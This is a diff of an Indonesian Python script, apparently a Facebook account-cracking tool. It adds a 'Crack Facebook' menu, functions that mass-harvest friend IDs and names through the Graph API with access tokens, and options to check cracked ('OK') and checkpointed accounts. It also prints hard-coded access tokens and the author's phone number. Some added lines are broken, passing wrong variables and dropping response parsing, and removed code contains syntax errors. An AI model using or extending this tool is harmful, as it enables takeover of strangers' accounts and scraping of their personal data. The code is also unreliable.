@@ -1,9 +1,14 @@
-#Scrip Masih Belum Sempurna#
-#No Whatsapp Author ->
-#Jangan DiPerjual Belikan#
-#Free Scrip#
-#Facebook -> Teddy Cahyo Putra Pangembara <- #
+###----------[ AUTHOR & CREATOR ]---------- ###
+# ------ [ Gausah Dioprek Ntar Error ] ------ #
+Author    = 'Strovmirviaska'
+Facebook  = 'Teddy Cahyo Putra Pangembara'
+Instagram = 'teddyyyy_11'
+Tiktok    = 'teddyyyy_11'
+Whatsapp  = '082290885204'
+# ------ [ Gunakan Dengan Baik ] ------ #
 
+
+###----------[ IMPORT LIBRARY ]---------- ###
 import requests,bs4,json,os,sys,random,datetime,time,re
 try:
 	import rich
@@ -31,6 +36,7 @@ except:ugen2 = ['Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a 
 
 id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
 
+###----------[ ANSII COLOR STYLE ]---------- ###
 x = '\33[m' # DEFAULT
 k = '\033[93m' # KUNING +
 h = '\x1b[1;92m' # HIJAU +
@@ -175,7 +181,6 @@ def krekefbi():
 	jalan('>_𝑴𝒆𝒏𝒖 𝑪𝒉𝒆𝒄𝒌𝑶𝒑𝒔𝒊/𝑯𝒂𝒔𝒊𝒍 𝑶𝑲/𝑪𝑷')
 	print('[04] 𝑪𝒉𝒆𝒄𝒌 𝑶𝒑𝒔𝒊 𝑯𝒂𝒔𝒊𝒍 𝑪𝒉𝒆𝒄𝒌𝒑𝒐𝒊𝒏𝒕')
 	print('[05] 𝑪𝒆𝒌 𝑯𝒂𝒔𝒊𝒍 𝑪𝒓𝒂𝒄𝒌 𝑶𝑲/𝑪𝑷')
-	print('[06] 𝑪𝒆𝒌 UAG')
 	print('[00] 𝑬𝒙𝒊𝒕') 
 	badag = input('>_ 𝑺𝒊𝒍𝒂𝒉𝒌𝒂𝒏 𝑷𝒊𝒍𝒊𝒉. :  ')
 	if badag in ['1','01']:
@@ -188,8 +193,6 @@ def krekefbi():
 		muda()
 	elif badag in ['5','05']:
 		pedo()
-	elif badag in ['6','06']:
-		tua()
 	elif badag in ['0','00']:
 		menu_test()
 	
@@ -203,9 +206,7 @@ def muda():
 	result()
 def pedo():
 	file()
-def tua():
-	useragent()
-
+	
 def bottzy():
 	jalan('>_Menu BOT') 
 	print('[01]>_BOT Share')
@@ -218,6 +219,51 @@ def bottzy():
 	
 def kanjoed():
 	main()
+
+def menu():
+	try:sh = requests.get('https://httpbin.org/ip').json()
+	except:sh = {'origin':'-'}
+	try:
+		tglx = my_birthday.split('/')[1]
+		blnx = dic2[str(my_birthday.split('/')[0])]
+		thnx = my_birthday.split('/')[2]
+		birth = tglx+' '+blnx+' '+thnx
+	except:birth = '-'
+	banner()
+	sg = '>_Menu Tools Crack Facebook'
+	fx = mark(sg, style='red')
+	sol().print(fx)
+	#print(x+'['+h+'•'+x+'] \033[0;33m>_Nama Kamu  : '+str(my_name))
+	#print(x+'['+h+'•'+x+'] \033[0;33m>_ID Kamu    : '+str(my_id))
+	#print(x+'['+h+'•'+x+'] \033[33m>_Tanggal Kamu  : '+str(birth))
+	#print(x+'['+h+'•'+x+'] \033[33m>_IP Kamu   : '+str(sh['origin']))
+	io = '\x1b[1;95m[01] >_Crack Dari Pertemanan Publik\n\x1b[1;95m[02] >_Crack ID Dari Akun Publik (Massal) \n\x1b[1;95m[03] >_Crack Dari Grup\n\x1b[1;95m[04] >_Cek Hasil Crack\n\033\x1b[1;95m[05] >_Cek Hasil Crack [00] >_Keluar'
+	oi = nel(io, style='cyan')
+	cetak(nel(oi, title='>_Pilih 1 Sampai 8'))
+	jh = input('\033[33m>_Pilih : ')
+	if jh in ['1','01']:
+		dump_publik()
+	elif jh in ['2','02']:		
+		dump_massal()
+	elif jh in ['3','03']:
+		grup()
+	elif jh in ['4','04']:
+		result()
+	elif jh in ['5','05']:
+		file()
+		#elif jh in ['10','0010']:
+		#fritoken()
+	elif jh in ['0','00']:
+		os.system('rm -rf .token.txt')
+		print('\033[33m>_Tunggu ...')
+		time.sleep(1)
+		sw = '>_Berhasil Keluar'
+		sol().print(mark(sw, style='green'))
+		exit()
+	else:
+		ric = '>_Pilih Yang Benar'
+		sol().print(mark(ric, style='red'))
+		exit()
 
 def dump():
 	try:
@@ -443,7 +489,7 @@ def dump_publik():
 	print('\033[33m>_𝑲𝒆𝒕𝒊𝒌 ❞𝒎𝒆❞ 𝑱𝒊𝒌𝒂 𝑰𝒏𝒈𝒊𝒏 𝑫𝒖𝒎𝒑 𝑰𝑫 𝑫𝒂𝒓𝒊 𝑻𝒆𝒎𝒂𝒏')
 	pil = input('\033[33m>_𝑴𝒂𝒔𝒖𝒌𝒂𝒏 𝑰𝑫 𝑭𝒂𝒄𝒆𝒃𝒐𝒐𝒌 : ')
 	try:
-		koh2 = requests.get('https://graph.facebook.com/v4.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0]).json()
+		koh2 = requests.get("https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s"%(id,token))
 		for pi in koh2['friends']['data']:
 			try:id.append(pi['id']+'|'+pi['name'])
 			except:continue
@@ -485,7 +531,7 @@ def dump_massal():
 		uid.append(kl)
 	for userr in uid:
 		try:
-			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0]).json()
+			col = ses.get("https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s"%(id,token))
 			for mi in col['friends']['data']:
 				try:
 					iso = (mi['id']+'|'+mi['name'])
@@ -1629,47 +1675,6 @@ def token_gratis():
 	print("""%s \33[1;33m\n\nEAABsbCS1iHgBAF2El6dIVMH6L5uWPVn4th6vRjUUkABPAdRvfIbZCyZBqOxVQUEZBDoMMwHzzjAENkgBsNYQavdsiTlcCBa2bwz7dbrG3PZClX2pFWJbLHnDuYKrCh8YXVwyGePBntX6jCcyUiMqP4BzWfJZBFyq5YiVYJpPdAwZDZD """%(h))
 	print("""%s \33[1;33m\n\nEAABsbCS1iHgBACi23luB3rXpkQtaxs8CudZBPlieKZCZCMYnBJZBxmF3bQmi1Gp9Pb0bwgHpvXqqKoNtacjgbTtn70aoFGrqyZApVySEpDWhLMV4s6wkztXbzrCHdQytXVm3WwXLYVWVnsA5jM1FyfBZAB8wZBHeUrcL0W7J6fIOAZDZD """%(h))
 	exit()
-
-def useragent():
-    pilih_menu_user_agent()
-    dc = input('   %s└──> %s'%(A,J))
-	elif dc in ['1','01','b']:pilih_otomatis()
-	elif dc in ['2','02','d']:ua_device_ini()
-	elif dc in ['3','03','z']:krekefbi()
-    else:print('\n   %s[%s•%s] %sIsi Yang Benar %s!%s\n'%(M,P,M,P,M,P));exit()
-	
-def pilih_otomatis():
-    pilih_device()
-    dc = input('   %s└──> %s'%(A,J))
-    if dc in ['0','00','z']:     open('tool/useragent.json','w').write(ua_default)
-    elif dc in ['1','01','a']:   open('tool/useragent.json','w').write(ua_samsung)
-    elif dc in ['2','02','b']:   open('tool/useragent.json','w').write(ua_nokia)
-    elif dc in ['3','03','c']:   open('tool/useragent.json','w').write(ua_xiaomi)
-    elif dc in ['4','04','d']:   open('tool/useragent.json','w').write(ua_oppo)
-    elif dc in ['5','05','e']:   open('tool/useragent.json','w').write(ua_vivo)
-    elif dc in ['6','06','f']:   open('tool/useragent.json','w').write(ua_iphone)
-    elif dc in ['7','07','g']:   open('tool/useragent.json','w').write(ua_asus)
-    elif dc in ['8','08','h']:   open('tool/useragent.json','w').write(ua_lenovo)
-    elif dc in ['9','09','i']:   open('tool/useragent.json','w').write(ua_huawei)
-    elif dc in ['10','010','j']: open('tool/useragent.json','w').write(ua_windows)
-    elif dc in ['11','011','k']: open('tool/useragent.json','w').write(ua_chrome)
-    elif dc in ['12','012','l']: open('tool/useragent.json','w').write(ua_fb)
-    else:print('\n   %s[%s•%s] %sIsi Yang Benar %s!%s\n'%(M,P,M,P,M,P));exit()
-    try:
-        pilihan = open('tool/useragent.json','r').read()
-        printer(Panel(f'''{A2}{pilihan}''',title=f'{J2}[ {P2}User Agent {J2}]',subtitle=f'{J2}[ {P2}Sukses Diganti {J2}]',padding=(1,4),width=54,title_align='center',style='#FF8F00'))
-        if pengguna_source_code == 'old':input('\n   %s[ %sKembali %s]'%(J,P,J));tampilan_menu()
-        else:print('\n               %s[ %sJalankan Ulang SCnya %s]'%(J,P,J));exit('\n')
-    except Exception as e:print('\n   %s[%s•%s] %sIsi Yang Benar %s!%s\n'%(M,P,M,P,M,P));exit()
-
-def ua_device_ini():
-    url = 'https://www.google.com/search?q=my+user+agent'
-    try:
-        if "linux" in sys.platform.lower():chrome_path = '/usr/bin/google-chrome %s';webbrowser.get(chrome_path).open(url)
-        elif "win" in sys.platform.lower():chrome_path = 'C:/Program Files (x86)/Google/Chrome/Application/chrome.exe %s';webbrowser.get(chrome_path).open(url)
-        else:chrome_path = 'open -a /Applications/Google\ Chrome.app %s';webbrowser.get(chrome_path).open(url)
-        manual_user_agent()
-    except Exception as e:print('\n   %s[%s•%s] %sTidak Dapat Menemukan Useragent %s!%s\n'%(M,P,M,P,M,P));time.sleep(3);
                         
 if __name__=='__main__':
 	try:os.mkdir('CP')
